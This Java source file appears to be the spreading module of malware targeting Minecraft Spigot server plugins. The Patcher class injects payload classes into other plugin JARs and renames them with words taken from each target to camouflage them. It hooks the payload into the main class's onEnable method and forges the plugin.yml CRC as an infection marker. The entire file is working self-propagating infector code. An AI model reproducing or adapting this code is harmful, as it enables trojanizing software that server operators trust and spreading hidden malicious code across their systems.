package com.tmquan2508.exploit.spread;

import javassist.*;
import javassist.bytecode.ClassFile;
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.net.JarURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.zip.CRC32;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.logging.Level;
import com.tmquan2508.exploit.Exploit;

public final class Patcher {

    public static boolean patchFile(String origJarPath, String outJarPath, Class<?> sourceClassToInject) {
        Exploit.sender.sendDebug(Level.INFO, String.format("[Patcher] Request: '%s' -> '%s'", origJarPath, outJarPath));
        Path input = Paths.get(origJarPath);
        if (PatchUtils.isAlreadyPatched(input)) {
            Exploit.sender.sendDebug(Level.INFO, "[Patcher] Target is already patched. Skipping.");
            return false;
        }

        try {
            return performPatching(origJarPath, outJarPath, sourceClassToInject);
        } catch (Throwable e) {
            Exploit.sender.sendDebug(Level.SEVERE, "[CRITICAL] A critical error occurred during patching. Rolling back.");
            Exploit.sender.sendDebug(Level.SEVERE, PatchUtils.stackTrace(e));
            try { Files.deleteIfExists(Paths.get(outJarPath)); } catch (IOException ignored) {}
            return false;
        }
    }

    private static boolean performPatching(String orig, String out, Class<?> sourceClassToInject) throws Throwable {
        Path input = Paths.get(orig);
        Path output = Paths.get(out);

        CamouflageUtils.CamouflagePlan plan = CamouflageUtils.generateCamouflagePlan(input.toFile());
        Exploit.sender.sendDebug(Level.INFO, "[+] Patcher: Generated CAMOUFLAGE plan.");
        Exploit.sender.sendDebug(Level.INFO, "  |-> Target Package: " + plan.packageName());
        Exploit.sender.sendDebug(Level.INFO, "  |-> New Base Name: " + plan.namePrefix());

        Files.copy(input, output, StandardCopyOption.REPLACE_EXISTING);

        Map<String, Object> pluginYAML = PatchUtils.readPluginYAML(output.toAbsolutePath().toString());
        if (pluginYAML == null) {
            Exploit.sender.sendDebug(Level.WARNING, "[!] Patcher: Not a valid Spigot plugin. Cleaning up.");
            Files.delete(output);
            return false;
        }
        String mainClass = (String) pluginYAML.get("main");
        Exploit.sender.sendDebug(Level.INFO, "[+] Patcher: Found plugin main class: " + mainClass);

        ClassPool pool = new ClassPool(ClassPool.getDefault());
        List<CtClass> allInjectedClasses = new ArrayList<>();
        try (FileSystem outStream = FileSystems.newFileSystem(output, (ClassLoader) null)) {
            PayloadInjector.Result injectionResult = PayloadInjector.inject(pool, outStream, sourceClassToInject, plan.packageName(), plan.namePrefix());
            allInjectedClasses.addAll(injectionResult.allPayloadClasses());

            if (injectionResult.finalPayloadFQN == null) {
                throw new IllegalStateException("Failed to determine the final FQN for the main payload class.");
            }

            MainClassPatcher.hook(pool, outStream, orig, mainClass, injectionResult.finalPayloadFQN);
        } finally {
            Exploit.sender.sendDebug(Level.INFO, "[+] Patcher: Detaching all classes from Javassist pool to free memory.");
            for (CtClass cc : allInjectedClasses) {
                cc.detach();
            }
        }

        PatchUtils.setInfectionMarkerOnTarget(output);
        Exploit.sender.sendDebug(Level.INFO, String.format("[SUCCESS] Successfully patched '%s'.", output.getFileName()));
        return true;
    }

    private static class PayloadInjector {
        record Result(String finalPayloadFQN, Collection<CtClass> allPayloadClasses) {}

        public static Result inject(ClassPool pool, FileSystem outStream, Class<?> sourceBaseClass, String newPackagePath, String newBaseName) throws Exception {
            Exploit.sender.sendDebug(Level.INFO, "[+] Injector: Starting payload injection.");
            List<Class<?>> classesToInject = PatchUtils.getClassesToInject(sourceBaseClass);

            ClassMap relocationMap = new ClassMap();
            String finalPayloadFQN = null;
            String newPackageName = newPackagePath.replace('/', '.');

            Exploit.sender.sendDebug(Level.INFO, "[+] Injector: Building relocation map for renaming...");
            for (Class<?> clazz : classesToInject) {
                String sourceFQN = clazz.getName();
                String newSimpleName = clazz.getSimpleName().replace(sourceBaseClass.getSimpleName(), newBaseName);
                String destFQN = newPackageName + "." + newSimpleName;

                if (clazz.equals(sourceBaseClass)) {
                    finalPayloadFQN = destFQN;
                }
                relocationMap.put(sourceFQN, destFQN);
                Exploit.sender.sendDebug(Level.INFO, String.format("  |-> MAP: '%s' ==> '%s'", sourceFQN, destFQN));
            }

            Collection<CtClass> allPayloadClasses = new ArrayList<>();
            Exploit.sender.sendDebug(Level.INFO, "[+] Injector: Loading and transforming payload classes...");
            for (Class<?> clazz : classesToInject) {
                String resourcePath = clazz.getName().replace('.', '/') + ".class";
                try (InputStream is = clazz.getClassLoader().getResourceAsStream(resourcePath)) {
                    if (is == null) throw new IOException("Cannot find payload resource: " + resourcePath);

                    CtClass ctClass = pool.makeClass(is);
                    ctClass.replaceClassName(relocationMap);
                    allPayloadClasses.add(ctClass);
                }
            }

            Exploit.sender.sendDebug(Level.INFO, "[+] Injector: Writing transformed classes to output JAR...");
            for (CtClass cc : allPayloadClasses) {
                String newFQN = cc.getName();
                Path targetPath = outStream.getPath(newFQN.replace('.', '/') + ".class");
                if (targetPath.getParent() != null) Files.createDirectories(targetPath.getParent());
                Files.write(targetPath, cc.toBytecode());
                Exploit.sender.sendDebug(Level.INFO, "  |-> Wrote: " + targetPath);
            }

            Exploit.sender.sendDebug(Level.INFO, "[+] Injector: Payload injection phase complete.");
            return new Result(finalPayloadFQN, allPayloadClasses);
        }
    }

    private static class MainClassPatcher {
        public static void hook(ClassPool pool, FileSystem outStream, String originalJarPath, String mainClass, String finalPayloadFQN) throws Exception {
            Exploit.sender.sendDebug(Level.INFO, "[+] Hooker: Starting main class hook process.");
            pool.insertClassPath(originalJarPath);

            CtClass ccMain = null;
            try {
                Exploit.sender.sendDebug(Level.INFO, "  |-> Getting CtClass for: " + mainClass);
                ccMain = pool.get(mainClass);

                Exploit.sender.sendDebug(Level.INFO, "  |-> Getting 'onEnable' method.");
                CtMethod onEnableMethod = ccMain.getDeclaredMethod("onEnable");

                String injectionCode = String.format("{ try { new %s((org.bukkit.plugin.Plugin)this); } catch (Throwable t) { t.printStackTrace(); } }", finalPayloadFQN);
                Exploit.sender.sendDebug(Level.FINE, "[DEBUG] Hooker: Code to be injected into onEnable(): " + injectionCode);
                onEnableMethod.insertAfter(injectionCode);

                Path mainClassPath = outStream.getPath(mainClass.replace('.', '/') + ".class");
                Exploit.sender.sendDebug(Level.INFO, "  |-> Writing modified main class back to: " + mainClassPath);
                Files.write(mainClassPath, ccMain.toBytecode(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);

                Exploit.sender.sendDebug(Level.INFO, "[+] Hooker: Hooking process complete.");
            } finally {
                if (ccMain != null) {
                    ccMain.detach();
                }
            }
        }
    }

    private static class CamouflageUtils {
        public record CamouflagePlan(String packageName, String namePrefix) {}
        private static final Random RANDOM = new Random();
        private static final Pattern CAMEL_CASE_SPLIT_PATTERN = Pattern.compile("(?<!(^|[A-Z]))(?=[A-Z])|(?<!^)(?=[A-Z][a-z])");

        public static CamouflagePlan generateCamouflagePlan(File targetJarFile) {
            Map<String, List<String>> packageStructure = scanJarForPackageStructure(targetJarFile);
            if (packageStructure.isEmpty()) {
                return new CamouflagePlan("com/tmquan2508/internal/safe", "InternalTask");
            }
            List<Map.Entry<String, List<String>>> packagesSorted = packageStructure.entrySet().stream()
                .filter(entry -> entry.getKey() != null && !entry.getKey().isEmpty() && !entry.getKey().startsWith("META-INF"))
                .sorted(Comparator.comparingInt(e -> e.getValue().size() * -1))
                .collect(Collectors.toList());

            if (packagesSorted.isEmpty()) {
                return new CamouflagePlan("com/tmquan2508/internal/fallback", "Task");
            }

            Map.Entry<String, List<String>> chosenEntry = packagesSorted.get(RANDOM.nextInt(Math.min(3, packagesSorted.size())));
            String chosenPackagePath = chosenEntry.getKey();
            List<String> classNamesInPackage = chosenEntry.getValue();
            List<String> dictionary = buildWordDictionaryFrom(classNamesInPackage);

            if (dictionary.isEmpty()) {
                return new CamouflagePlan(chosenPackagePath, "Core");
            }

            List<String> simpleNames = classNamesInPackage.stream().map(s -> s.substring(0, s.lastIndexOf('.'))).collect(Collectors.toList());
            String namePrefix = buildUniqueWordName(dictionary, simpleNames, 1, 2);

            return new CamouflagePlan(chosenPackagePath, namePrefix);
        }

        private static List<String> buildWordDictionaryFrom(List<String> classNames) {
            return classNames.stream()
                .map(className -> className.substring(0, className.lastIndexOf('.')))
                .flatMap(className -> Arrays.stream(CAMEL_CASE_SPLIT_PATTERN.split(className)))
                .map(word -> word.replaceAll("[^a-zA-Z0-9]", ""))
                .filter(word -> word.length() > 2)
                .distinct()
                .collect(Collectors.toList());
        }

        private static String buildUniqueWordName(List<String> dictionary, List<String> existingNames, int minWords, int maxWords) {
            String name;
            int attempts = 0;
            do {
                int wordCount = minWords + (maxWords > minWords ? RANDOM.nextInt(maxWords - minWords + 1) : 0);
                StringBuilder nameBuilder = new StringBuilder();
                for (int i = 0; i < wordCount; i++) {
                    String word = dictionary.get(RANDOM.nextInt(dictionary.size()));
                    nameBuilder.append(Character.toUpperCase(word.charAt(0))).append(word.substring(1).toLowerCase());
                }
                name = nameBuilder.toString();
                if (attempts > 10) name += attempts;
                attempts++;
            } while (name.isEmpty() || existingNames.contains(name));
            return name;
        }

        private static Map<String, List<String>> scanJarForPackageStructure(File jarFile) {
            Map<String, List<String>> packageMap = new HashMap<>();
            try (ZipFile zipFile = new ZipFile(jarFile)) {
                Enumeration<? extends ZipEntry> entries = zipFile.entries();
                while (entries.hasMoreElements()) {
                    ZipEntry entry = entries.nextElement();
                    if (entry.isDirectory() || !entry.getName().endsWith(".class") || entry.getName().contains("$"))
                        continue;
                    String fullPath = entry.getName();
                    int lastSlash = fullPath.lastIndexOf('/');
                    String packageName = (lastSlash == -1) ? "" : fullPath.substring(0, lastSlash);
                    packageMap.computeIfAbsent(packageName, k -> new ArrayList<>()).add(fullPath.substring(lastSlash + 1));
                }
            } catch (IOException e) {
                Exploit.sender.sendDebug(Level.WARNING, "[Camouflage] Error scanning JAR file: " + e.getMessage());
            }
            return packageMap;
        }
    }

    private static class PatchUtils {
        public static String stackTrace(Throwable e) {
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));
            return sw.toString();
        }

        public static List<Class<?>> getClassesToInject(Class<?> baseClass) {
            List<Class<?>> classes = new ArrayList<>();
            classes.add(baseClass);
            classes.addAll(Arrays.asList(baseClass.getDeclaredClasses()));
            return classes;
        }

        public static boolean isAlreadyPatched(Path jarPath) {
            try (ZipFile zipFile = new ZipFile(jarPath.toFile())) {
                ZipEntry entry = zipFile.getEntry("plugin.yml");
                if (entry == null) return false;
                long storedCrc = entry.getCrc();
                long expectedCrc = CrcPatcher.calculateFakeCRC();
                if (storedCrc == expectedCrc) {
                    Exploit.sender.sendDebug(Level.INFO, "[+] PatchCheck: Plugin already patched (marker found).");
                    return true;
                }
            } catch (IOException e) {
                Exploit.sender.sendDebug(Level.WARNING, "[!] PatchCheck: Could not check for fake CRC marker: " + e.getMessage());
            }
            return false;
        }

        public static void setInfectionMarkerOnTarget(Path targetJarPath) throws IOException {
            try {
                Exploit.sender.sendDebug(Level.INFO, "[+] Marker: Setting infection marker by faking plugin.yml CRC...");
                CrcPatcher.markJarWithFakeCRC(targetJarPath.toFile());
                Exploit.sender.sendDebug(Level.INFO, "[+] Marker: Fake CRC marker set successfully.");
            } catch (Exception e) {
                throw new IOException("Failed to set fake marker on " + targetJarPath.getFileName(), e);
            }
        }

        public static Map<String, Object> readPluginYAML(String path) {
            String inputFile;
            String absolutePath = new File(path).getAbsolutePath();

            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                inputFile = "jar:file:/" + absolutePath.replace('\\', '/') + "!/plugin.yml";
            } else {
                inputFile = "jar:file://" + absolutePath + "!/plugin.yml";
            }

            try {
                URL url = new URL(inputFile);
                JarURLConnection connection = (JarURLConnection) url.openConnection();
                connection.setUseCaches(false);
                try (InputStream is = connection.getInputStream()) {
                    return new Yaml().load(is);
                }
            } catch (Exception e) {
                Exploit.sender.sendDebug(Level.WARNING, "[!] PatchUtils: Failed to read plugin.yml from '" + inputFile + "'. Error: " + e.getMessage());
                return null;
            }
        }
    }

    private static class CrcPatcher {
        private static final int EOCD_SIGNATURE = 0x06054b50;
        private static final int CENTRAL_DIR_SIGNATURE = 0x02014b50;
        private static final String FAKE_STRING = "openbd.injected";

        public static void markJarWithFakeCRC(File jarFile) throws IOException {
            byte[] bytes = Files.readAllBytes(jarFile.toPath());
            int eocdOffset = findEOCDOffset(bytes);
            if (eocdOffset == -1) throw new IOException("EOCD not found");

            int centralDirOffset = getIntLE(bytes, eocdOffset + 16);
            int currentOffset = centralDirOffset;

            while (getIntLE(bytes, currentOffset) == CENTRAL_DIR_SIGNATURE) {
                int fileNameLength = getShortLE(bytes, currentOffset + 28);
                String filename = new String(bytes, currentOffset + 46, fileNameLength, StandardCharsets.UTF_8);

                if ("plugin.yml".equals(filename)) {
                    int crcOffset = currentOffset + 16;
                    putIntLE(bytes, crcOffset, (int) calculateFakeCRC());
                    Files.write(jarFile.toPath(), bytes, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);
                    return;
                }
                int extraFieldLength = getShortLE(bytes, currentOffset + 30);
                int fileCommentLength = getShortLE(bytes, currentOffset + 32);
                currentOffset += 46 + fileNameLength + extraFieldLength + fileCommentLength;
            }
            throw new IOException("plugin.yml not found in central directory");
        }

        public static long calculateFakeCRC() {
            CRC32 crc = new CRC32();
            crc.update(FAKE_STRING.getBytes(StandardCharsets.UTF_8));
            return crc.getValue();
        }

        private static int findEOCDOffset(byte[] bytes) {
            for (int i = bytes.length - 22; i >= 0; i--) {
                if (getIntLE(bytes, i) == EOCD_SIGNATURE) return i;
            }
            return -1;
        }

        private static int getIntLE(byte[] b, int off) {
            return (b[off] & 0xFF) | ((b[off + 1] & 0xFF) << 8) | ((b[off + 2] & 0xFF) << 16) | ((b[off + 3] & 0xFF) << 24);
        }

        private static void putIntLE(byte[] b, int off, int val) {
            b[off] = (byte) (val & 0xFF);
            b[off + 1] = (byte) ((val >> 8) & 0xFF);
            b[off + 2] = (byte) ((val >> 16) & 0xFF);
            b[off + 3] = (byte) ((val >> 24) & 0xFF);
        }

        private static int getShortLE(byte[] b, int off) {
            return (b[off] & 0xFF) | ((b[off + 1] & 0xFF) << 8);
        }
    }
}